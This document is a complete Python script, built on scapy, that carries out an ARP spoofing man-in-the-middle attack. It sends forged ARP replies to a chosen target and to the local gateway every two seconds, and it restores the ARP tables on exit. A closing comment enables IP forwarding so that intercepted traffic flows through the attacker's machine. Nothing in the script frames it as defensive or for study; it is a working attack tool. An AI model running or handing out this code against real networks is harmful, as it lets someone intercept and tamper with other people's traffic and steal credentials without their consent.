import scapy.all as scapy
import time
import subprocess
import re
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Specify an Target IP, use --help for more info")
    return options


def get_gateway_ip():
    gateway_ip = re.search(r"\d\d\d.\d\d\d.\d.\d", subprocess.check_output(["route", "-n"]).decode())
    return gateway_ip.group(0)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = get_gateway_ip()
try:
    sent_packets_count = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C.......Resetting ARP tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


# IP FORWARDING
# echo 1 > /proc/sys/net/ipv4/ip_forward
